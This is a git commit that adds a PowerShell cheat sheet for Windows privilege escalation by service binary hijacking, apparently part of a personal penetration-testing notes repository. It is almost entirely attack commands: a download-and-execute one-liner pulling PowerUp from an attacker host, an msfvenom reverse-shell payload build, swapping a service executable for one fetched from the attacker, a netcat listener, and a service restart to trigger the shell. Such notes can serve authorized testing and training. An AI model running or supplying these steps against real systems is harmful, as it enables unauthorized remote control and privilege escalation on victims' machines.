c0412ee7750e8452481723b1ce236825938292c2
Sr4nd3rs0n <73143623+Sr4nd3rs0n@users.noreply.github.com>
2024-08-14 18:51:08 +0200

    Create BinaryHijacking_BasicsSteps.ps1
    Initial

---
+++ PrivilegeEscalation/Windows/CommPrivEscVectors/BinaryHijacking/BinaryHijacking_BasicsSteps.ps1
@@ -0,0 +1,19 @@
+#Using PowerUp:
+##From Victim Powershell:
+iex (New-Object Net.WebClient).DownloadString('http://<IP_ATTACKER>/PowerUp.ps1')
+Invoke-AllChecks  ||  Get-ModifiableServiceFile
+
+#From Kali --> Once we have loceted the vulnerable Service:
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP_ATTACKER> LPORT=<PORT> -f exe -o <SERVICE>.exe
+
+#From Victim Powershell:
+##Create a Service's backup just in case
+mv <BINARY_PATH>\<SERVICE>.exe .\Backup_<SERVICE>.exe
+cd <BINARY_PATH>
+iwr -uri http://<IP_ATTACKER>/<SERVICE>.exe -Outfile <SERVICE>.exe
+
+#From Kali:
+rlwrap nc -nvlp <PORT>  || penelope <PORT> -i tun0
+
+#From Victim Powershell:
+Restart-Service <SERVICE>
